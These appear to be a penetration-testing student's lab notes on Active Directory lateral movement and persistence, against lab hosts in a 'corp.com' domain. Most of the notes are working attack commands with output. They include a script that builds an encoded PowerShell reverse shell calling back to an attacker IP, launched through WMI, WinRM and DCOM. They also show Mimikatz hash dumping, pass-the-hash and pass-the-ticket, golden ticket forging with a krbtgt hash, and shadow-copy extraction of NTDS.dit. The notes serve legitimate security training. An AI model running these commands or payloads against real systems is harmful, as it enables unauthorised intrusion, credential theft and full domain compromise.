Password cracking takes time and may fail.
Kerberos and NTLM do not use the clear text password directly, and native tools from Microsoft do not support authentication using the password hash.

# WMI and WinRM

### WMI
*Windows Management Instrumentation*
- An object-oriented feature that facilitates task automation
- Capable of creating processes via the _Create_ method from the _Win32_Process_ class
- Communicates through [_Remote Procedure Calls_](https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page) (RPC) over port 135 for remote access and uses a higher-range port (19152-65535) for session data

>Historically, wmic has been abused for lateral movement via the command line by specifying the target IP after the **/node:** argument then the user and password after the **/user:**  **/password:** arguments

Will need need the credentials of a member of the _Administrators_ local group (which can also be a domain user)

##### Scenario:

- Will instruct **wmic** to open the calculator
	- Opening calc is typically used for PoCs & testing
- Will attack the Files04 server

- RDP in as `jeff` to Client74
- Launch `calc` app on Files04 under `jen`
```powershell
wmic /node:192.168.200.73 /user:jen /password:Nexus123! process call create "calc"
	Executing (Win32_Process)->Create()
	Method execution successful.
	Out Parameters:
	instance of __PARAMETERS
	{
	        ProcessId = 3680;
	        ReturnValue = 0;
	};
```
	- ReturnValue 0 - Process was created successfully.
	- Process *win32calc.exe* would now appear on that machine w/in the Task Manager

>System processes and services always run in session [0](https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361) as part of session isolation, which was introduced in Windows Vista. Because the WMI Provider Host is running as a system service, the newly created processes through WMI are also spawned in session 0.


As **wmic** has been deprecated, it's important to know how to carry this off w/in PS:
- Need to create a PSCredentialObject which stores the session user & pw
	- Store the uname & pw as variables
	- Secure the pw via `ConvertTo-SecureString` cmdlet
	- Create a `PSCredentialObject` w/ the stored uname & secured pw.

```powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```

- Need to create a *Common Information Model* (CIM) via the **New-CimSession** cmdlet.
	- Specify DCOM as the protocol for the WMI session
	- Create the new session, **New-Cimsession** against our target IP & supply the cred variable
	- Define 'calc' as the payload to be executed
```powershell
$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $options 
$command = 'calc';
```

- Tie together all the arguments we configured previously by issuing the _Invoke-CimMethod_ cmdlet and supplying **Win32_Process** to the _ClassName_ and **Create** to the _MethodName_
	- Send the argument, we wrap them in **@{CommandLine =$Command}**.
```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```


- Putting it all together, once RDP'd into Client74 via `jeff`, send the full PS commands
```powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName 192.168.200.73 -Credential $credential -SessionOption $options
$command = 'calc'
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
	ProcessId ReturnValue PSComputerName
	--------- ----------- --------------
	      908           0 192.168.200.73
```

- Python script for an encoded reverse shell in powershell
```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

- Corrected PS commands
```powershell
$command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAA1ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
	ProcessId ReturnValue PSComputerName
	--------- ----------- --------------
	     1280           0 192.168.200.73
```

- Result in Kali's nc listener
```bash
sudo nc -nlvp 443      
	[sudo] password for kali: 
	listening on [any] 443 ...
	connect to [192.168.45.245] from (UNKNOWN) [192.168.200.73] 56931
	hostname
		FILES04
	PS C:\Windows\system32> whoami
		corp\jen
```


### WinRM
Microsoft version of the WS-Management protocol
- Exchanges XML messages over HTTP and HTTPS
- Uses TCP port 5986 for encrypted HTTPS traffic and port 5985 for plain HTTP.
- Implemented in numerous built-is utilities
	- Ex:  **winrs**

> For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.
> Only works for domain users

##### CmdLine & Revshell

```powershell
winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
	FILES04
	corp\jen
```
	- -r - Target host
	- -u - uname
	- -p - pw
	- List of commands we want utilized

- Can replace with encoded revshell from earlier
```powershell
winrs -r:files04 -u:jen -p:Nexus123! "cmd /c powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAA1ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
	#< CLIXML
```

> Careful!  Won't return domain info....
```powershell
net group /domain
	The request will be processed at a domain controller for domain corp.com.
```

##### PowerShell Remoting

- Set up variables as before.  Will only need `$credential`
```powershell
New-PSSession -ComputerName 192.168.200.73 -Credential $credential
	 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
	 -- ----            ------------    ------------    -----         -----------------     ------------
	  1 WinRM1          192.168.200.73  RemoteMachine   Opened        Microsoft.PowerShell     Available

Enter-PSSession 1
	[192.168.200.73]: PS C:\Users\jen\Documents> whoami
		corp\jen
	[192.168.200.73]: PS C:\Users\jen\Documents> ipconfig
		Windows IP Configuration
		Ethernet adapter Ethernet0:
		
		   Connection-specific DNS Suffix  . :
		   Link-local IPv6 Address . . . . . : fe80::c4de:857:a395:9cec%9
		   IPv4 Address. . . . . . . . . . . : 192.168.200.73
		   Subnet Mask . . . . . . . . . . . : 255.255.255.0
		   Default Gateway . . . . . . . . . : 192.168.200.254
	[192.168.200.73]: PS C:\Users\jen\Documents> net user /domain
		The request will be processed at a domain controller for domain corp.com.
		
		net : System error 5 has occurred.
		    + CategoryInfo          : NotSpecified: (System error 5 has occurred.:String) [], RemoteException
		    + FullyQualifiedErrorId : NativeCommandError
		
		Access is denied.
```


# psexec
- Replacement for telnet-like applications and provide remote execution of processes on other systems through an interactive console
- Part of the SysInternals suite
	- Not installed by default, but easily transferable
- Can be misused for lateral movement
	- User authenticating to target must be part of Admins local group
	- ADMIN$ share must be available                         -> Default on Win Server
	- File and Printer Sharing must be turned on         -> Default on Win Server


To execute the command remotely, PsExec performs the following tasks:
- Writes **psexesvc.exe** into the **C:\Windows** directory
- Creates and spawns a service on the remote host
- Runs the requested program/command as a child process of **psexesvc.exe**

##### Scenario

- RDP access as local Admin user `offsec` on client74
```bash
xfreerdp /cert-ignore /u:offsec /p:lab /v:192.168.220.74
```
	- NOTE: no `/d` flag is used as it's the local Admin user, not a domain user.

- Invoke an interactive (`-i`) session on the remote host
```powershell
powershell.exe
cd C:\Tools\SysinternalsSuite

.\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
	PsExec v2.4 - Execute processes remotely
	Copyright (C) 2001-2022 Mark Russinovich
	Sysinternals - www.sysinternals.com

	Microsoft Windows [Version 10.0.20348.169]
	(c) Microsoft Corporation. All rights reserved.
	
	C:\Windows\system32>hostname
		FILES04
	
	C:\Windows\system32>whoami
		corp\jen
```


# AD Pass-The-Hash
- Allows an attacker to auth to a remote system or service using a user's NTLM hash instead of their plaintext pw.
- Will only work for servers or services using NTLM, not servers or services using Kerberos
- Mapped in MITRE under [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) general technique
- Used by:
	- PsExec from Metasploit
	- [Passing-the-hash toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
	- [Impacket](https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py)

##### PreReqs
- Requires SMB connection
- Windows File and Printer Sharing are enabled
- ADMIN$ share must be available
	- Must present valid credentials with local administrative perms
- Local admin rights

##### Mechanics
More or less the same as non-domain connected PtH:
- Attacker connects to the victim using SMB protocol
- Performs auth using the NTLM hash

Vulnerability lies in the fact that we gained unauthorized access to the password hash of a local admin

Most tools built to abuse PtH can be leveraged to start a Win service & comm w/ it using Named Pipes using the [Service Control Manager](https://msdn.microsoft.com/en-us/library/windows/desktop/ms685150(v=vs.85).aspx)

- Use `impacket-wmiexec`
```bash
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.227.72
	Impacket v0.12.0.dev1 - Copyright 2023 Fortra
	
	[*] SMBv3.0 dialect used
	[!] Launching semi-interactive shell - Careful what you execute
	[!] Press help for extra shell commands
	C:\>hostname
		web04
	
	C:\>whoami
		web04\administrator
	
	C:\>type c:\users\administrator\desktop\flag.txt
		OS{c152f43fd9b142e595b6e6e8a5b891e2}
```


> Works for Active Directory domain accounts and the built-in local administrator account. However, due to the [2014 security update](https://support.microsoft.com/en-us/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-a), this technique can not be used to authenticate as any other local admin account.


# Overpass the Hash

Can over abuse a users's NTLM hash to gain a full Kerberos TGT.   Can then use the TGT to obtain a TGS.

##### Scenario:
- Compromised a workstation or server that `jen` has authenticated to
- Assuming computer is caching their creds

To simulate cached creds:
- Login to Client76 as `offsec`
- Run a process as a different user (`jen`)
	- Shift Rt-click the Notepad icon on the desktop yielding the option
		 ![](runas_diffUser.png)
	- Afterwards, enter `jen`s creds


However the creds are cached, proceed to use Mimikatz to turn the NTLM hash into a Kerberos ticket
```powershell
Start-Process powershell.exe -Verb runAs

cd C:\tools\
.\mimikatz.exe

#Create PS process in context of admin
privilege::debug
	Privilege '20' OK

sekurlsa::pth /domain:corp.com /user:jen /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
	user    : jen
	domain  : corp.com
	program : powershell
	impers. : no
	NTLM    : 369def79d8372408bf6e93364cc93075
	  |  PID  7324
	  |  TID  7892
	  |  LSA Process is now R/W
	  |  LUID 0 ; 1908628 (00000000:001d1f94)
	  \_ msv1_0   - data copy @ 0000018169A76A80 : OK !
	  \_ kerberos - data copy @ 00000181699655D8
	   \_ aes256_hmac       -> null
	   \_ aes128_hmac       -> null
	   \_ rc4_hmac_nt       OK
	   \_ rc4_hmac_old      OK
	   \_ rc4_md4           OK
	   \_ rc4_hmac_nt_exp   OK
	   \_ rc4_hmac_old_exp  OK
	   \_ *Password replace @ 00000181699A3DA8 (32) -> null
```

- In new PS window, check user & cached tickets
```powershell
whoami
	client76\offsec

hostname
	CLIENT76

klist
	Current LogonId is 0:0x1d1f94
	
	Cached Tickets: (0)
```
	- Not surprising that there's currently no tickets as `jen` hasn't logged on interactively yet


- Connect to web04 & check cached tickets
```powershell
net use \\web04
	The command completed successfully.


klist
	Current LogonId is 0:0x1d1f94
	
	Cached Tickets: (2)
	#0>     Client: jen @ CORP.COM
	        Server: krbtgt/CORP.COM @ CORP.COM
	        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
	        Start Time: 9/1/2024 14:57:58 (local)
	        End Time:   9/2/2024 0:57:58 (local)
	        Renew Time: 9/8/2024 14:57:58 (local)
	        Session Key Type: RSADSI RC4-HMAC(NT)
	        Cache Flags: 0x1 -> PRIMARY
	        Kdc Called: DC1.corp.com
	
	#1>     Client: jen @ CORP.COM
	        Server: cifs/web04 @ CORP.COM
	        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
	        Start Time: 9/1/2024 14:57:58 (local)
	        End Time:   9/2/2024 0:57:58 (local)
	        Renew Time: 9/8/2024 14:57:58 (local)
	        Session Key Type: AES-256-CTS-HMAC-SHA1-96
	        Cache Flags: 0
	        Kdc Called: DC1.corp.com
```
	- Ticket #0 is a TGT because the server is krbtgt
	- Ticket #1 is a TGS for the _Common Internet File System_ (CIFS) service


We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication

PsExec can run a command remotely but does not accept password hashes.
Since we have generated Kerberos tickets and operate in the context of `jen` in the PowerShell session, we can reuse the TGT to obtain code execution on the `web04` host
```powershell
# Psexec to web04 & check user
cd C:\tools\SysinternalsSuite\


.\PsExec64.exe \\web04 cmd
	PsExec v2.4 - Execute processes remotely
	Copyright (C) 2001-2022 Mark Russinovich
	Sysinternals - www.sysinternals.com
	
	
	Microsoft Windows [Version 10.0.20348.887]
	(c) Microsoft Corporation. All rights reserved.

	C:\Windows\system32>hostname
		web04

	C:\Windows\system32>whoami
		corp\administrator
```


# Pass the Ticket

While TGT can only be used on the machine it was created for, TGS can be exported, re-injected elsewhere, & used to auth to a specific service.
If the service tickets belong to the current user, no admin privs are req'd

##### Scenario
- Abuse an existing session of `dave`
- _dave_ user has privileged access to the _backup_ folder located on WEB04
	- Logged-in user `jen` doesn't
- Attack plan: extract all the current TGT/TGS in memory and inject _dave_'s WEB04 TGS into our own session

- RDP as `jen` and test folder access
```powershell
whoami
	corp\jen

ls \\web04\backup
	ls : Access to the path '\\web04\backup' is denied.
	At line:1 char:1
	+ ls \\web04\backup
	+ ~~~~~~~~~~~~~~~~~
	    + CategoryInfo          : PermissionDenied: (\\web04\backup:String) [Get-ChildItem], UnauthorizedAccessException
	    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

- Launch mimikatz & export tickets
```powershell
cd C:\Tools\
.\mimikatz.exe
	
	  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
	 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
	 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
	 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
	 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
	  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
	
	mimikatz # privilege::debug
	Privilege '20' OK
	
	# mimikatz
	sekurlsa::tickets /export
		
		Authentication Id : 0 ; 1404738 (00000000:00156f42)
		Session           : Batch from 0
		User Name         : dave
		Domain            : CORP
		Logon Server      : DC1
		Logon Time        : 9/1/2024 4:43:35 PM
		SID               : S-1-5-21-1987370270-658905905-1781884369-1103
		
				 * Username : dave
				 * Domain   : CORP.COM
				 * Password : (null)
		
				Group 0 - Ticket Granting Service
				...
```
	- Cmd parsed the LSASS process space in memory for any TGT/TGS, which is then saved to disk in the kirbi mimikatz format
	- Way too long to sift through like this, but first item shows `dave` initiated a service


- Verify newly generated tickets with **dir**, filtering out on the **kirbi** extension
```powershell
dir *.kirbi
	 Volume in drive C has no label.
	 Volume Serial Number is 686D-15D0
	
	 Directory of C:\Tools
	
	09/01/2024  04:43 PM             1,577 [0;12a952]-0-0-40810000-dave@cifs-web04.kirbi
	09/01/2024  04:43 PM             1,521 [0;12a952]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
	09/01/2024  04:43 PM             1,577 [0;132c07]-0-0-40810000-dave@cifs-web04.kirbi
	09/01/2024  04:43 PM             1,521 [0;132c07]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
	09/01/2024  04:43 PM             1,577 [0;1369ef]-0-0-40810000-dave@cifs-web04.kirbi
	09/01/2024  04:43 PM             1,521 [0;1369ef]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
	09/01/2024  04:43 PM             1,577 [0;146205]-0-0-40810000-dave@cifs-web04.kirbi
	09/01/2024  04:43 PM             1,521 [0;146205]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
	09/01/2024  04:43 PM             1,577 [0;149ffb]-0-0-40810000-dave@cifs-web04.kirbi
	...
```
	- Can pick any TGS ticket in the **dave@cifs-web04.kirbi** format


-  Inject it through mimikatz via the **kerberos::ptt** command & check for success
```powershell
kerberos::ptt [0;12a952]-0-0-40810000-dave@cifs-web04.kirbi

	* File: '[0;12a952]-0-0-40810000-dave@cifs-web04.kirbi': OK


klist
	Current LogonId is 0:0xba63b
	
	Cached Tickets: (1)
	
	#0>     Client: dave @ CORP.COM
	        Server: cifs/web04 @ CORP.COM
	        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	        Ticket Flags 0x40810000 -> forwardable renewable name_canonicalize
	        Start Time: 9/1/2024 16:40:19 (local)
	        End Time:   9/2/2024 2:40:19 (local)
	        Renew Time: 9/8/2024 16:40:19 (local)
	        Session Key Type: AES-256-CTS-HMAC-SHA1-96
	        Cache Flags: 0
	        Kdc Called:
```
	- `dave` ticket has been successfully imported in our own session for the `jen` user

- Now list contents of folder
```powershell
ls \\web04\backup
	Directory: \\web04\backup
	
	Mode                LastWriteTime         Length Name
	----                -------------         ------ ----
	-a----        9/13/2022   5:52 AM              0 backup_schemata.txt
	-a----         9/1/2024   4:38 PM             78 flag.txt
```

# DCOM
- [Distributed Component Object Model](https://msdn.microsoft.com/en-us/library/cc226801.aspx)
- Very old techs

#### COM (Component Object Model)
- System for creating software components that interact with each other
- Created for either same-process or cross-process interaction

#### DCOM
- For interaction between multiple computers over a network
- Essentially an API
- Performed over RPC on TCP port 135
- Local admin access is req to call the service

Lateral movement techniques
- Based on the [_Microsoft Management Console_](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/microsoft-management-console-start-page) (MMC) COM application
	- Employed for scripted automation of Windows systems

#### MMC
- Allows the creation of [Application Objects](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/application-object?redirectedfrom=MSDN), which expose the _ExecuteShellCommand_ method under the _Document.ActiveView_ property.
	- Allows the execution of any shell command as long as the authenticated user is authorized
		- Default for local administrators.

##### Scenario
- `jen` user logged into `client74`
- Instantiate a remote MMC 2.0 application by specifying the target IP of `files04` as the second argument of the _GetTypeFromProgID_ method
	- Need elevated PS prompt

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
```

- Pass the required argument to the application via the [**ExecuteShellCommand**](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc/view-executeshellcommand) method & use an encoded PS revshell
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdA.....GUAKAApAA==","7")
```


# Persistance

Set of techniques used to maintain the attacker's foothold even after a reboot or cred change.

>Note that in many real-world penetration tests or red-team engagements, persistence is not part of the scope due to the risk of incomplete removal once the assessment is complete.

## Golden Ticket

- Self-made, custom TGT
	- Requires obtaining the `krbtgt` password hash
- More powerful attack vector than Silver Tickets
	- Silver tickets are for *a specific* service
	- Gold tickets are for the *entire domain*

>We must carefully protect stolen _krbtgt_ password hashes because they grant unlimited domain access.
>Consider explicitly obtaining the client's permission before executing this technique

##### Re-Kerberos Auth:
- When a user submits a request for a TGT:
	- KDC encrypts the TGT with a secret key known only to the KDCs in the domain.
		- Secret key = password hash of a domain user account called [_krbtgt_](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn745899(v=ws.11)#Sec_KRBTGT).

Best advantage is that the _krbtgt_ account password is not automatically changed.
- Only changed when the domain functional level is upgraded from a pre-2008 Windows server, but not from a newer version

>The [_Domain Functional Level_](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels) dictates the capabilities of the domain and determines which Windows operating systems can be run on the domain controller.
>Higher functional levels enable additional features, functionality, and security mitigations.


- RDP into `client74` as `jen` & verify lack of access
```powershell
.\PsExec64.exe \\dc1 cmd.exe
	PsExec v2.4 - Execute processes remotely
	Copyright (C) 2001-2022 Mark Russinovich
	Sysinternals - www.sysinternals.com
	
	Couldn't access dc1:
	Access is denied.
```


At this stage, the golden ticket will require us to have access to a Domain Admin's group account or to have compromised the domain controller itself to work as a persistence method

- Extract the password hash of the _krbtgt_ account with Mimikatz
```powershell
# mimikatz
privilege::debug
	Privilege '20' OK

lsadump::lsa /patch
	Domain : CLIENT74 / S-1-5-21-4060895957-195960390-4124122524
	
	RID  : 000001f4 (500)
	User : Administrator
	LM   :
	NTLM :
	
	RID  : 000001f7 (503)
	User : DefaultAccount
	LM   :
	NTLM :
	
	RID  : 000001f5 (501)
	User : Guest
	LM   :
	NTLM :
	
	RID  : 000003e9 (1001)
	User : offsec
	LM   :
	NTLM : 2892d26cdf84d7a70e2eb3b9f05c425e
	
	RID  : 000001f6 (502)
	User : krbtgt
	LM   :
	NTLM : 1693c6cefafffc7af11ef34d1c788f47
	
	RID  : 000001f8 (504)
	User : WDAGUtilityAccount
	LM   :
	NTLM : 6aea19f007238031deec323efe489037
```


Creating & injecting a golden ticket into memory
- Doesn't req admin privs
- Can be performed on a comp not domain joined


- Delete any existing Kerberos tickets
```powershell
# mimikatz
kerberos::purge
	Ticket(s) purge for current session is OK
```

- Create golden ticket with `jen`'s domain SID (don't forget to drop the user ID at the end)
	- Use the **/krbtgt** option instead of **/rc4** to indicate we are supplying the password hash of the _krbtgt_ user account
```powershell
whoami /user
	USER INFORMATION
	----------------
	
	User Name SID
	========= =============================================
	corp\jen  S-1-5-21-1987370270-658905905-1781884369-1124
#  REMEMBER TO LOSE THE LAST 4 DIGITS (USER ID: 1124)

# mimikatz
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
	User      : jen
	Domain    : corp.com (CORP)
	SID       : S-1-5-21-1987370270-658905905-1781884369
	User Id   : 500
	Groups Id : *513 512 520 518 519
	ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
	Lifetime  : 9/2/2024 7:39:07 AM ; 8/31/2034 7:39:07 AM ; 8/31/2034 7:39:07 AM
	-> Ticket : ** Pass The Ticket **
	
	 * PAC generated
	 * PAC signed
	 * EncTicketPart generated
	 * EncTicketPart encrypted
	 * KrbCred generated
	
	Golden ticket for 'jen @ corp.com' successfully submitted for current session

# open up a cmd prompt w/ ticket
misc::cmd
	Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF77477B800
```

- Can verify ticket
```powershell
klist
	Current LogonId is 0:0x25c260
	
	Cached Tickets: (1)
	
	#0>     Client: jen @ corp.com
	        Server: krbtgt/corp.com @ corp.com
	        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
	        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
	        Start Time: 9/2/2024 7:29:23 (local)
	        End Time:   8/31/2034 7:29:23 (local)
	        Renew Time: 8/31/2034 7:29:23 (local)
	        Session Key Type: RSADSI RC4-HMAC(NT)
	        Cache Flags: 0x1 -> PRIMARY
	        Kdc Called:
```

- Use **psexec** and the golden ticket to connect to `dc1` with `jen`
```powershell
.\PsExec64.exe \\dc1 cmd.exe
	PsExec v2.4 - Execute processes remotely
	Copyright (C) 2001-2022 Mark Russinovich
	Sysinternals - www.sysinternals.com
	
	
	Microsoft Windows [Version 10.0.20348.887]
	(c) Microsoft Corporation. All rights reserved.
	
	C:\Windows\system32>type C:\users\administrator\desktop\flag.txt
		OS{fb8eaa4a1cbeb301de590318cdf58f05}
```

> Mimikatz provides two sets of default values when using the golden ticket option: the user ID and the groups ID.
> The user ID is set to 500 by default, which is the RID of the built-in administrator for the domain.
> The values for the groups ID consist of the most privileged groups in Active Directory, including the Domain Admins group.


By creating our own TGT and then using PsExec, we are performing the _overpass the hash_ attack by leveraging Kerberos auth

>If we were to connect PsExec to the IP address of the domain controller instead of the hostname,
>we would instead force the use of NTLM authentication and access would still be blocked


## Shadow Copies
- aka Volume Shadow Service (VSS)
- Backup tech allowing for creation of snapshots of files or entire volumes 

**vshadow.exe**
- Manages the volume shadow copies
- Can be abused to create a Shadow Copy that allows us to extract the AD db [NTDS.dit](https://technet.microsoft.com/en-us/library/cc961761.aspx) file
	- Need SYSTEM hive & can then extract every cred offline

- RDP as `jeffadmin` to `dc1` & run utility from elevated cmd prompt
```powershell
powershell.exe
Start-Process powershell.exe -Verb runAs

# From C:\Tools
vshadow.exe -nw -p C:
	VSHADOW.EXE 3.0 - Volume Shadow Copy sample client.
	Copyright (C) 2005 Microsoft Corporation. All rights reserved.
	
	(Option: No-writers option detected)
	(Option: Persistent shadow copy)
	(Option: Create shadow copy set)
	- Setting the VSS context to: 0x00000019
	Creating shadow set {523569da-46ad-42da-a45f-2bc4973bb890} ...
	- Adding volume \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\] to the shadow set...
	Creating the shadow (DoSnapshotSet) ...
	(Waiting for the asynchronous operation to finish...)
	Shadow copy set succesfully created.
